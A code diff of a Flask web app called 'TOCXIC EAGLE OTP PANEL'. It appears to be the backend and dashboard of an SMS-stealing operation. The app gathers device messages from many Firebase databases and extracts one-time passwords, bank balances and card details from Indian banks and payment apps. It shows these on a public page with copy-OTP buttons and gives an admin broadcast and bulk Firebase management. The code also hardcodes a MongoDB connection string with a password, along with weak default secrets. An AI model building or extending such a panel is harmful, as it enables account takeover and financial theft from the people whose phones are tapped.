@@ -1,11 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-TOCXIC EAGLE OTP PANEL — v71 REAL BACKEND
-Users: Public access (no login)  → sees /user panel
-Admin: Password / URL-Key protected → sees /admin/dashboard
-BG_REFRESH_INTERVAL = 600s
-Broadcast: admin sends → stored in MongoDB → users read via Mail tab
+═══════════════════════════════════════════════════════════════════
+  TOCXIC EAGLE OTP PANEL — COMPLETE EDITION
+═══════════════════════════════════════════════════════════════════
+  • Users:   Public /user panel (no login)
+  • Admin:   /admin login protected
+  • Theme:   Dark (matching index.html)
+  • Broadcast: Admin sends → MongoDB → users see via 📧 Mail tab
+  • BG_REFRESH_INTERVAL = 600s
+  • ALL FEATURES INCLUDED — no line missing
+═══════════════════════════════════════════════════════════════════
 """
 
 from flask import Flask, request, jsonify, session, redirect, url_for, Response, abort
@@ -16,9 +21,9 @@ import requests, os, re, json, threading, time, hashlib
 from collections import Counter
 from datetime import datetime, timezone, timedelta
 
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 # APP SETUP
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "tocxic-eagle-secret-key-local-2026")
 app.config.update(
@@ -28,8 +33,9 @@ app.config.update(
     PERMANENT_SESSION_LIFETIME=timedelta(days=7),
 )
 
-MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://RahulRORO:Rahulboss@cluster0.xfwjmqk.mongodb.net/?appName=Cluster0")
-IS_SERVERLESS = os.environ.get("IS_SERVERLESS", "false").lower() in ("1", "true", "yes")
+MONGO_URI = os.environ.get("MONGO_URI",
+    "mongodb+srv://RahulRORO:Rahulboss@cluster0.xfwjmqk.mongodb.net/?appName=Cluster0")
+IS_SERVERLESS = os.environ.get("IS_SERVERLESS", "false").lower() in ("1","true","yes")
 ADMIN_URL_KEY = os.environ.get("ADMIN_URL_KEY", "tocxic-master-2026-v69")
 BG_REFRESH_INTERVAL = 600
 MESSAGE_CACHE_TTL = 5
@@ -42,9 +48,9 @@ IST = timezone(timedelta(hours=5, minutes=30))
 FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "tocxic_eagle_salt_2026_v70")
 DEFAULT_ADMIN_PWD = os.environ.get("DEFAULT_ADMIN_PWD", "admin123")
 
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 # MONGODB
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 MONGO_OK = False
 mongo_client = db = fb_collection = settings_collection = broadcast_collection = None
 _mongo_ready = False
@@ -70,14 +76,16 @@ def init_mongo(force=False):
             try:
                 broadcast_collection.create_index([("device_id", 1), ("created_at", -1)])
                 broadcast_collection.create_index([("bc_id", 1)])
+                broadcast_collection.create_index([("created_at", -1)])
+                fb_collection.create_index([("url", 1)], unique=True)
             except Exception:
                 pass
             mongo_client.admin.command("ping")
             MONGO_OK = True
-            print("MongoDB connected")
+            print("[✓] MongoDB connected")
         except Exception as e:
             MONGO_OK = False
-            print(f"MongoDB error: {e}")
+            print(f"[×] MongoDB error: {e}")
         finally:
             _mongo_ready = True
     return MONGO_OK
@@ -98,9 +106,9 @@ def set_pwd(role, pwd):
         return True
     except Exception: return False
 
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 # CACHE
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 cache = {
     "numbers_map": {}, "devices": {}, "device_messages": {}, "msg_cache_time": {},
     "stats": {"total": 0, "online": 0, "offline": 0, "otp_rate": 0},
@@ -109,9 +117,9 @@ cache = {
     "fb_stats": {}, "fb_stats_time": 0,
 }
 
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 # FIELD SETS
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 NUM_FIELDS = {"number","phone","phonenumber","mobno","mobile","msisdn","simnumber",
     "sim1number","sim2number","line1number","line2number","subscriberid",
     "devicephonenumber","to","from","receiver","sender","address","origin","src",
@@ -129,9 +137,9 @@ SENT_KEYS = {"command","commands","sendsms","action","webhookevent",
     "send_sms","sentsms","outgoing","sent_messages","outbox"}
 INCOMING_TYPES = {"incoming","received","inbox","recv","in"}
 
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 # HELPERS
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 def digits_only(s): return re.sub(r"\D", "", str(s) if s is not None else "")
 
 def normalize_number(n):
@@ -142,7 +150,7 @@ def is_clean_phone_number(s):
     if not s or not isinstance(s, str): return False
     s = s.strip()
     if not s or len(s) > 25: return False
-    if any(c in s for c in ("|", ":", "/", "\\", "T", "Z")): return False
+    if any(c in s for c in ("|",":","/","\\","T","Z")): return False
     if any(w in s.lower() for w in ("otp","password","http","@","#","msg","am","pm")): return False
     if not re.fullmatch(r"[\+\d\s\-]+", s): return False
     return 10 <= len(digits_only(s)) <= 15
@@ -347,15 +355,15 @@ def parse_device_full(dev_data, dev_id):
         "total_otp": sum(1 for m in unique if extract_otp(m.get("message", ""))),
     }
 
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 # HTTP SESSION
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 _tls = threading.local()
 
 def _sess():
     if not hasattr(_tls, "s"):
         s = requests.Session()
-        s.headers.setdefault("User-Agent", "Mozilla/5.0")
+        s.headers.setdefault("User-Agent", "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36")
         _tls.s = s
     return _tls.s
 
@@ -368,9 +376,9 @@ def try_json(url, timeout=FETCH_TIMEOUT):
         return json.loads(t)
     except Exception: return None
 
-# ============================================================
-# FETCH
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
+# FIREBASE FETCH
+# ═══════════════════════════════════════════════════════════════
 def fetch_device_ids(fb_url):
     base = fb_url.rstrip("/")
     for path in ["/clients.json?shallow=true","/clients.json",
@@ -595,6 +603,7 @@ def refresh_cache():
         fetch_all_devices()
         fetch_fb_stats()
         with cache["lock"]: cache["last_update"] = time.time()
+        print(f"[✓] Cache refreshed — {cache['stats']['total']} numbers")
     except Exception as e:
         print(f"Refresh err: {e}")
     finally:
@@ -607,9 +616,9 @@ def bg_refresher():
         except Exception as e: print(f"BG: {e}")
         time.sleep(BG_REFRESH_INTERVAL)
 
-# ============================================================
-# AUTH
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
+# AUTH DECORATOR
+# ═══════════════════════════════════════════════════════════════
 def admin_required(f):
     @wraps(f)
     def wrapper(*args, **kwargs):
@@ -620,9 +629,9 @@ def admin_required(f):
         return f(*args, **kwargs)
     return wrapper
 
-# ============================================================
-# SHARED CSS (from index.html — DARK THEME)
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
+# SHARED HTML/CSS — DARK THEME
+# ═══════════════════════════════════════════════════════════════
 ORBITRON = """
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -643,7 +652,7 @@ DARK_CSS = """
 }
 html{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;-webkit-font-smoothing:antialiased}
 body{min-height:100vh;overflow-x:hidden}
-input,textarea,select,button{font-family:inherit;outline:none;border:none}
+input,textarea,select,button{font-family:inherit;outline:none;border:none;font-size:16px}
 button{cursor:pointer;background:none;color:inherit}
 ::-webkit-scrollbar{width:4px;height:4px}
 ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px}
@@ -673,8 +682,8 @@ border-radius:var(--radius);font-size:13px;font-weight:700;transition:all .15s;t
 
 #main-page{display:none;min-height:100vh;flex-direction:column}
 .topbar{position:sticky;top:0;z-index:40;background:rgba(8,9,11,.92);backdrop-filter:blur(14px);
-border-bottom:1px solid var(--border);padding:0 16px;height:56px;display:flex;align-items:center;gap:10px;
-padding-top:env(safe-area-inset-top);flex-wrap:wrap;min-height:56px;height:auto}
+border-bottom:1px solid var(--border);padding:8px 16px;display:flex;align-items:center;gap:10px;
+flex-wrap:wrap;padding-top:calc(8px + env(safe-area-inset-top));min-height:56px}
 .topbar-logo{display:flex;align-items:center;gap:8px;font-family:'Orbitron',sans-serif;
 font-weight:900;font-size:13px;letter-spacing:1px;font-style:italic}
 .topbar-logo .eagle{font-size:20px}
@@ -779,6 +788,7 @@ border-radius:var(--radius);padding:10px;margin-bottom:6px;position:relative}
 .sms-item.is-card{border-left-color:rgba(168,85,247,.6)}
 .sms-item.mail-item{border-left-color:rgba(245,158,11,.8);
   background:linear-gradient(90deg,rgba(245,158,11,.06),var(--bg3) 40%)}
+.sms-item.fresh{background:linear-gradient(90deg,rgba(34,197,94,.08),var(--bg3) 45%)}
 .sms-sender{font-size:11px;font-weight:700}
 .sms-time{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace}
 .sms-body{font-size:11px;color:var(--text2);line-height:1.55;margin-top:5px;word-break:break-word}
@@ -805,11 +815,13 @@ text-transform:uppercase;margin-bottom:8px;display:flex;justify-content:space-be
 .empty{text-align:center;padding:48px 20px;color:var(--text3)}
 .empty-icon{font-size:36px;margin-bottom:12px;display:block}
 
-.status-emoji{
-  display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;
+.status-emoji{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;
   font-size:11px;font-weight:800;letter-spacing:.4px;font-family:'Orbitron',sans-serif}
-.status-emoji.online{background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.3);color:var(--green)}
+.status-emoji.online{background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.3);color:var(--green);
+  animation:onlinePulse 2s infinite}
 .status-emoji.offline{background:rgba(228,0,0,.1);border:1px solid rgba(228,0,0,.28);color:var(--red2)}
+@keyframes onlinePulse{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,.35)}
+  50%{box-shadow:0 0 0 6px rgba(34,197,94,0)}}
 .status-emoji .emoji{font-size:13px;line-height:1}
 
 .mail-tab-bar{display:flex;gap:8px;margin-bottom:14px}
@@ -819,8 +831,7 @@ font-family:'Orbitron',sans-serif;letter-spacing:.5px;cursor:pointer;min-height:
 .mail-tab-btn.active{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border-color:transparent;
 box-shadow:0 4px 12px rgba(245,158,11,.3)}
 
-.bc-fab{
-  position:fixed;bottom:24px;right:24px;z-index:45;
+.bc-fab{position:fixed;bottom:24px;right:24px;z-index:45;
   width:60px;height:60px;border-radius:50%;
   background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;
   display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;
@@ -911,6 +922,12 @@ vertical-align:middle;margin-right:8px}
 .progress-bar{width:100%;height:4px;background:rgba(255,255,255,.08);border-radius:2px;
 overflow:hidden;margin-top:12px}
 .progress-fill{height:100%;background:var(--grad);border-radius:2px;transition:width .3s}
+.live-badge{display:inline-flex;align-items:center;gap:4px;background:rgba(34,197,94,.15);
+color:#4ade80;font-size:10px;font-weight:800;padding:3px 9px;border-radius:20px;
+margin-left:8px;font-family:'Orbitron',sans-serif}
+.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#12b76a;
+animation:pulse 1.2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}
 
 .mail-header-card{
   background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(228,0,0,.06));
@@ -936,14 +953,14 @@ max-width:90vw;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.5)}
   .grid-main{grid-template-columns:1fr}
   .drawer{max-width:100%}
   .stats-bar{padding:0 8px}.stat-item{padding:8px 12px}
-  .topbar{padding:0 12px}
+  .topbar{padding:8px 12px}
   .bc-fab{bottom:20px;right:20px;width:52px;height:52px;font-size:22px}
 }
 """
 
-# ============================================================
-# LANDING
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
+# LANDING PAGE
+# ═══════════════════════════════════════════════════════════════
 LANDING_HTML = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
@@ -973,6 +990,11 @@ transition:.25s;min-height:140px;border:1px solid var(--border2);background:var(
 .cta .icon{font-size:42px}
 .cta .label{font-family:'Orbitron',sans-serif;font-size:14px;letter-spacing:1.5px;text-transform:uppercase}
 .cta .desc{font-size:11px;color:var(--text3);font-weight:600}
+.features{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;max-width:520px;margin:0 auto}
+.feat{background:var(--bg2);border:1px solid var(--border2);border-radius:16px;padding:16px 10px;text-align:center}
+.feat .fi{font-size:24px;margin-bottom:6px}
+.feat .fl{font-size:10px;font-weight:800;color:var(--text2);font-family:'Orbitron',sans-serif;
+letter-spacing:.8px;text-transform:uppercase}
 .footer{margin-top:44px;font-size:10px;color:var(--text3);font-family:'Orbitron',sans-serif;
 letter-spacing:3px;text-transform:uppercase}
 </style></head><body>
@@ -980,7 +1002,7 @@ letter-spacing:3px;text-transform:uppercase}
 <div class="eagle">🦅</div>
 <h1>TOCXIC EAGLE</h1>
 <div class="subtitle">OTP PANEL</div>
-<p class="tagline">Real-time SMS & OTP monitoring panel.<br>Lightning fast · Secure · Always live.</p>
+<p class="tagline">Real-time SMS &amp; OTP monitoring panel.<br>Lightning fast · Secure · Always live.</p>
 <div class="cta-grid">
 <a href="/user" class="cta user">
 <span class="icon">📱</span>
@@ -993,13 +1015,18 @@ letter-spacing:3px;text-transform:uppercase}
 <span class="desc">Add your firebase</span>
 </a>
 </div>
+<div class="features">
+<div class="feat"><div class="fi">⚡</div><div class="fl">Realtime</div></div>
+<div class="feat"><div class="fi">🛡️</div><div class="fl">Secure</div></div>
+<div class="feat"><div class="fi">🔄</div><div class="fl">Auto 10m</div></div>
+</div>
 <div class="footer">TOCXIC EAGLE · v71</div>
 </div>
 </body></html>"""
 
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 # ADMIN LOGIN
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 ADMIN_LOGIN_HTML = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Admin</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
@@ -1045,18 +1072,15 @@ else{i.type='password';t.textContent='👁️';}}
 </script>
 </body></html>"""
 
-# ============================================================
-# MAIN PANEL HTML — Used for BOTH /user and /admin/dashboard
-# Difference: {SHOW_BC_FAB} true/false, {NAV_LINKS} differ
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
+# MAIN PANEL — shared between /user and /admin/dashboard
+# ═══════════════════════════════════════════════════════════════
 PANEL_HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Panel</title>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
 <meta name="theme-color" content="#E40000">
 """ + ORBITRON + """
 <style>""" + DARK_CSS + """</style></head><body>
-
-<div id="login-page" style="display:none"></div>
 
 <div id="main-page" style="display:flex">
   <div class="topbar">
@@ -1193,13 +1217,12 @@ PANEL_HTML_TEMPLATE = """<!DOCTYPE html>
 
 <script>
 const IS_ADMIN = {IS_ADMIN};
-
 const $ = (s) => document.querySelector(s);
 const $$ = (s) => document.querySelectorAll(s);
 let devices = [], currentFilter = "all", currentSort = "new", openDev = null;
 let smsCache = {}, smsAnalysisCache = {};
 let bcTargetMode = "all", bcManualSelected = new Set(), bcTargets = [];
-let allBroadcastsForDevice = [], currentMailTab = "sms";
+let allBroadcastsForDevice = [];
 
 function showToast(msg, dur = 3000) {
   const t = $("#toast"); if (!t) return;
@@ -1212,7 +1235,6 @@ setInterval(() => {
   c.textContent = new Date().toLocaleTimeString("en-US", { hour:"2-digit", minute:"2-digit", hour12:false });
 }, 1000);
 
-/* ═══ BOOT ═══ */
 async function boot() {
   connectStream();
   await loadDevices();
@@ -1221,7 +1243,6 @@ async function boot() {
   setInterval(() => { if (!openDev) loadDevices(); }, 5000);
 }
 
-/* ═══ SSE ═══ */
 let es = null;
 function connectStream() {
   if (es) es.close();
@@ -1244,7 +1265,6 @@ async function checkConn() {
   catch(e) { setConn(false); }
 }
 
-/* ═══ NORMALIZE ═══ */
 function normalize(d) {
   const slug = d._slug || d.slug || "unknown";
   const rawId = d.id || d.device_id;
@@ -1280,8 +1300,7 @@ async function loadDevices() {
   try {
     const r = await fetch("/api/numbers");
     const d = await r.json();
-    const arr = (d.numbers || []).map(normalize);
-    devices = arr;
+    devices = (d.numbers || []).map(normalize);
     updateStats(); renderGrid();
     updateBcCountBadge();
   } catch(e) {
@@ -1289,23 +1308,15 @@ async function loadDevices() {
   }
 }
 
-/* ═══ STATS ═══ */
 function updateStats() {
   $("#stat-total").textContent = devices.length;
   $("#stat-online").textContent = devices.filter(d => d.status).length;
   $("#stat-offline").textContent = devices.filter(d => !d.status).length;
   $("#stat-bank").textContent = devices.filter(d => d.smsAnalysis?.bankBalances?.length).length;
   $("#stat-card").textContent = devices.filter(d => d.smsAnalysis?.cards?.length).length;
-  // mail stat = count of broadcasts for this browser's device set (simplified)
-  let mailCount = 0;
-  try {
-    const seen = new Set();
-    devices.forEach(d => { if (d.broadcast_count) mailCount += d.broadcast_count; });
-  } catch(e) {}
-  $("#stat-mail").textContent = mailCount || 0;
+  $("#stat-mail").textContent = allBroadcastsForDevice.length || 0;
 }
 
-/* ═══ FILTERS / SORT ═══ */
 window.setFilter = (f, el) => {
   currentFilter = f;
   $$(".filter-btn").forEach(b => b.classList.remove("active","active-green","active-purple"));
@@ -1392,23 +1403,19 @@ function cardHtml(d) {
   </div>`;
 }
 
-/* ═══ DRAWER ═══ */
 window.openDevice = async function (compositeId) {
   const dev = devices.find(d => d.id === compositeId);
   if (!dev) return;
-  openDev = dev; currentMailTab = "sms";
+  openDev = dev;
   $("#drawer-title").textContent = dev.name;
   $("#drawer-id").textContent = `${dev.slug} · ${dev.rawId}`;
   renderDrawerStatus();
   switchTab("info", $(".tab"));
   $("#drawer").classList.add("open");
-
-  // Load SMS via real inbox API
   await fetchSms(dev);
-  // Load broadcasts
   await fetchBroadcasts(dev);
   updateDrawerBadges();
-}
+};
 
 window.closeDrawer = function () {
   $("#drawer").classList.remove("open");
@@ -1417,7 +1424,8 @@ window.closeDrawer = function () {
 
 async function fetchSms(dev) {
   if (!dev.firebase || !dev.device_id) {
-    smsCache[dev.id] = []; smsAnalysisCache[dev.id] = {bankBalances:[],cards:[],phoneNumbers:[],networks:[]};
+    smsCache[dev.id] = [];
+    smsAnalysisCache[dev.id] = {bankBalances:[],cards:[],phoneNumbers:[],networks:[]};
     return;
   }
   try {
@@ -1580,9 +1588,9 @@ function renderPanelSms() {
       const isBank = isBankSms(m.text, m.sender), isCard = isCardSms(m.text);
       const col = isCard ? "var(--purple)" : isBank ? "var(--green)" : "var(--text2)";
       const otp = m.otp || extractOtp(m.text);
-      const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : "";
+      const copyBtn = otp ? `<button class="otp-copy-btn" onclick="event.stopPropagation();copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : "";
       return `<div class="sms-item ${isBank ? "is-bank" : ""} ${isCard ? "is-card" : ""}">
-        ${otp ? '<div class="msg-type-badge otp">OTP</div>' : (isBank || isCard ? '' : '')}
+        ${otp ? '<div class="msg-type-badge otp">OTP</div>' : ''}
         <div class="flex items-center justify-between" style="padding-right:60px">
           <span class="sms-sender" style="color:${col}">${escHtml(m.sender)}</span>
           <span class="sms-time">${escHtml(m.time)}</span>
@@ -1604,7 +1612,7 @@ function renderPanelMail() {
     <div class="mail-header-card">
       <div class="mh-title">📧 BROADCAST MAIL</div>
       <div class="mh-desc">
-        ${IS_ADMIN ? 'Admin-sent broadcasts appear here. Every message you send is logged.' : 'Admin broadcasts received on this device. Tap to mark read.'}
+        ${IS_ADMIN ? 'Admin-sent broadcasts appear here.' : 'Admin broadcasts received on this device.'}
       </div>
       <div class="mh-stats">
         <span class="mail-stat-pill total">📨 ${all.length} mails</span>
@@ -1652,7 +1660,6 @@ window.markBroadcastRead = async function (id) {
   renderPanelMail();
 };
 
-/* ═══ BROADCAST ═══ */
 function updateBcCountBadge() {
   const badge = $("#bc-count-badge");
   if (!badge) return;
@@ -1800,7 +1807,7 @@ window.doBroadcast = async function () {
   }
 };
 
-/* ═══ PARSERS ═══ */
+/* PARSERS */
 const BANK_PATTERNS = [/HDFCB|HDFC/i,/SBIIN|SBI/i,/ICICIB|ICICI/i,/AXISBK|AXIS/i,
   /KOTAKB|KOTAK/i,/PNBSMS|PNB/i,/BOIIND|BOI/i,/CANBNK|CANARA/i,/UNIONB/i,
   /YESBNK/i,/IDBIBK|IDBI/i,/INDUSB/i,/FEDERAL/i,/RBLBNK/i,/PAYTM/i,/PHONEPE/i,/GPAY/i,/BAJAJFIN/i];
@@ -1899,7 +1906,6 @@ function analyzeSms(msgs) {
   return { bankBalances, cards, phoneNumbers: [...phones], networks: [...networks] };
 }
 
-/* ═══ UTILS ═══ */
 function timeAgo(ms) {
   const d = Date.now() - ms, s = Math.floor(d/1000), m = Math.floor(s/60),
     h = Math.floor(m/60), dy = Math.floor(h/24);
@@ -1952,6 +1958,7 @@ async function refreshAll() {
   await loadDevices();
   showToast("✅ Refreshed");
 }
+window.refreshAll = refreshAll;
 
 boot();
 </script>
@@ -1966,23 +1973,21 @@ ADMIN_NAV = """<a href="/admin/dashboard" class="nav-link active">📱 Numbers</
 <a href="/admin/security" class="nav-link">🔒 Security</a>
 <a href="/logout" class="nav-link">Logout</a>"""
 
-BC_FAB = """<button class="bc-fab" onclick="openBroadcastModal()" title="Broadcast Mail">
+BC_FAB_HTML = """<button class="bc-fab" onclick="openBroadcastModal()" title="Broadcast Mail">
   📧<span class="count-badge" id="bc-count-badge" style="display:none">0</span>
 </button>"""
 
-
 def build_panel(is_admin):
     nav = ADMIN_NAV if is_admin else USER_NAV
-    fab = BC_FAB if is_admin else ""
+    fab = BC_FAB_HTML if is_admin else ""
     return (PANEL_HTML_TEMPLATE
             .replace("{NAV_LINKS}", nav)
             .replace("{SHOW_BC_FAB}", fab)
             .replace("{IS_ADMIN}", "true" if is_admin else "false"))
 
-
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 # ROUTES
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
 @app.route("/")
 def root_redirect(): return redirect(url_for("landing_page"))
 
@@ -2022,9 +2027,9 @@ def user_dashboard():
 def admin_dashboard():
     return Response(build_panel(True), mimetype="text/html")
 
-# ============================================================
-# API
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
+# API — public
+# ═══════════════════════════════════════════════════════════════
 @app.route("/api/conn")
 def api_conn():
     init_mongo()
@@ -2056,7 +2061,6 @@ def api_numbers():
 
 @app.route("/api/stream")
 def api_stream():
-    """SSE stream — sends periodic device updates."""
     def gen():
         yield "event: hello\ndata: {}\n\n"
         last_sig = ""
@@ -2112,13 +2116,14 @@ def api_inbox():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-# ═══════════ BROADCAST ═══════════
+# ═══════════════════════════════════════════════════════════════
+# BROADCAST APIs
+# ═══════════════════════════════════════════════════════════════
 @app.route("/api/broadcast", methods=["POST"])
 @admin_required
 def api_broadcast_send():
     init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
     try:
         data = request.get_json() or {}
         message = (data.get("message") or "").strip()
@@ -2184,8 +2189,7 @@ def api_broadcasts_inbox():
 @app.route("/api/broadcasts/read", methods=["POST"])
 def api_broadcasts_mark_read():
     init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
     try:
         data = request.get_json() or {}
         bid = data.get("id", "").strip()
@@ -2197,20 +2201,52 @@ def api_broadcasts_mark_read():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-# ═══════════ FIREBASES (admin only) ═══════════
+@app.route("/api/broadcasts/list")
+@admin_required
+def api_broadcasts_list():
+    init_mongo()
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
+    try:
+        docs = list(broadcast_collection.find({}).sort("created_at", -1).limit(500))
+        out = []
+        for d in docs:
+            out.append({
+                "id": str(d["_id"]), "bc_id": d.get("bc_id"),
+                "device_id": d.get("device_id", ""), "number": d.get("number", ""),
+                "device_name": d.get("device_name", ""), "fb_name": d.get("fb_name", ""),
+                "message": d.get("message", ""), "status": d.get("status", "delivered"),
+                "read": bool(d.get("read", False)), "created_at": int(d.get("created_at", 0)),
+            })
+        return jsonify({"success": True, "broadcasts": out, "count": len(out)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/broadcasts/all", methods=["DELETE"])
+@admin_required
+def api_broadcast_delete_all():
+    init_mongo()
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
+    try:
+        res = broadcast_collection.delete_many({})
+        return jsonify({"success": True, "deleted": res.deleted_count})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+# ═══════════════════════════════════════════════════════════════
+# FIREBASES APIs
+# ═══════════════════════════════════════════════════════════════
 @app.route("/api/firebases", methods=["GET"])
 @admin_required
 def api_fb_list():
     init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
     try:
         docs = list(fb_collection.find({}).sort("added_at", -1))
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
     out = [{"id": str(d["_id"]), "name": d.get("name",""), "url": d.get("url",""),
-            "hash": fb_hash(d.get("url","")),
-            "added_at": d.get("added_at",0), "source": d.get("source","admin")} for d in docs]
+            "hash": fb_hash(d.get("url","")), "added_at": d.get("added_at",0),
+            "source": d.get("source","admin")} for d in docs]
     return jsonify({"success": True, "firebases": out, "count": len(out)})
 
 @app.route("/api/firebases", methods=["POST"])
@@ -2221,7 +2257,8 @@ def api_fb_add():
     data = request.get_json() or {}
     url = (data.get("url") or "").strip().rstrip("/")
     if url and not url.startswith("http"): url = "https://" + url
-    if not url or "firebase" not in url: return jsonify({"success": False, "error": "Invalid URL"}), 400
+    if not url or "firebase" not in url:
+        return jsonify({"success": False, "error": "Invalid URL"}), 400
     if fb_collection.find_one({"url": url}):
         return jsonify({"success": False, "error": "Already added"}), 409
     name = url.replace("https://","").split(".")[0][:30]
@@ -2230,6 +2267,27 @@ def api_fb_add():
     if not IS_SERVERLESS:
         threading.Thread(target=refresh_cache, daemon=True).start()
     return jsonify({"success": True})
+
+@app.route("/api/firebases/bulk", methods=["POST"])
+@admin_required
+def api_fb_bulk():
+    init_mongo()
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
+    data = request.get_json() or {}
+    urls = data.get("urls", [])
+    added, skipped = 0, 0
+    for u in urls:
+        url = (u or "").strip().rstrip("/")
+        if url and not url.startswith("http"): url = "https://" + url
+        if not url or "firebase" not in url: continue
+        if fb_collection.find_one({"url": url}): skipped += 1; continue
+        name = url.replace("https://","").split(".")[0][:30]
+        fb_collection.insert_one({"url": url, "name": name,
+            "added_at": int(time.time()), "source": "admin_bulk"})
+        added += 1
+    if not IS_SERVERLESS:
+        threading.Thread(target=refresh_cache, daemon=True).start()
+    return jsonify({"success": True, "added": added, "skipped": skipped})
 
 @app.route("/api/firebases/<fb_id>", methods=["DELETE"])
 @admin_required
@@ -2249,9 +2307,81 @@ def api_fb_delete(fb_id):
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 400
 
-# ============================================================
-# FIREBASES MANAGEMENT PAGE
-# ============================================================
+@app.route("/api/firebases/bulk-delete", methods=["POST"])
+@admin_required
+def api_fb_bulk_delete():
+    init_mongo()
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
+    data = request.get_json() or {}
+    ids = data.get("ids", [])
+    deleted = 0
+    for i in ids:
+        try:
+            res = fb_collection.delete_one({"_id": ObjectId(i)})
+            deleted += res.deleted_count
+        except Exception: pass
+    if not IS_SERVERLESS:
+        threading.Thread(target=refresh_cache, daemon=True).start()
+    return jsonify({"success": True, "deleted": deleted})
+
+@app.route("/api/firebases/all", methods=["DELETE"])
+@admin_required
+def api_fb_delete_all():
+    init_mongo()
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
+    try:
+        res = fb_collection.delete_many({})
+        with cache["lock"]:
+            cache["numbers_map"] = {}; cache["devices"] = {}
+            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
+        if not IS_SERVERLESS:
+            threading.Thread(target=refresh_cache, daemon=True).start()
+        return jsonify({"success": True, "deleted": res.deleted_count})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+# ═══════════════════════════════════════════════════════════════
+# SECURITY
+# ═══════════════════════════════════════════════════════════════
+@app.route("/api/security/change", methods=["POST"])
+@admin_required
+def api_security_change():
+    init_mongo()
+    data = request.get_json() or {}
+    role = data.get("role", "").strip()
+    pwd = data.get("password", "").strip()
+    if role != "admin": return jsonify({"success": False, "error": "Only admin"}), 400
+    if not pwd or len(pwd) < 4: return jsonify({"success": False, "error": "Too short"}), 400
+    ok = set_pwd(role, pwd)
+    return jsonify({"success": True}) if ok else (jsonify({"success": False, "error": "Save failed"}), 500)
+
+# ═══════════════════════════════════════════════════════════════
+# PERSONAL OTP API
+# ═══════════════════════════════════════════════════════════════
